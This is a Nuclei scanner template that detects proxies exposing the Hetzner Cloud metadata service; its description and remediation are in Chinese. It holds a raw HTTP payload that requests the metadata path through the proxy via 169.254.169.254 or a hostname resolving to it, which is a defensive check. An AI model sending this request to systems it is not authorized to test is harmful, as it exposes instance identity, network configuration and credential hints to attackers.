id: metadata-service-hetzner

# This attack abuses a misconfigured proxy that allows access to the metadata
# IP or a name which resolves to the IP. A standard proxy request is made to
# the proxy using the full metadata URL, which the proxy will fulfill to its
# own metadata service.
#
# The proxy may also be vulnerable to host/port enumeration on localhost or
# inside the private network.
info:
  name: Hetzner Cloud 元数据 服务 Check
  author: sullo
  severity: critical
  description: |
    检测到 Hetzner Cloud 元数据 服务 Check。目标可能暴露云实例、容器或运行环境元数据，攻击者可据此获取实例身份、网络配置、凭据线索或部署信息。
  remediation: |
    - 限制该端点的公网访问，仅允许可信来源访问。
    - 启用认证、授权和审计，并根据业务需要关闭不必要的调试或管理功能。
  reference:
    - https://docs.hetzner.cloud/#server-metadata
    - https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
    - https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 9.3
    cwe-id: CWE-441
  metadata:
    max-request: 2
  tags: exposure,config,hetzner,proxy,misconfig,metadata,vuln

http:
  - raw:
      - |+
        GET http://{{hostval}}/v1/metadata/private-networks HTTP/1.1
        Host: {{hostval}}

    payloads:
      hostval:
        - aws.oast.online
        - 169.254.169.254
    unsafe: true
    matchers:
      - type: word
        part: body
        words:
          - "alias_ips:"
          - "local-ipv4:"
          - "instance-id:"
        condition: or
# digest: 4a0a00473045022011830925be6de78c3efdce6756a622c57ac7f2cb16f2fc061a73f2961b043c34022100f5b30c7ad4c3dbd49ca504810cd5d3f8890bc94076903a8ec7b9db3f11eb4f9d:922c64590222798bb761d5b6d8e72950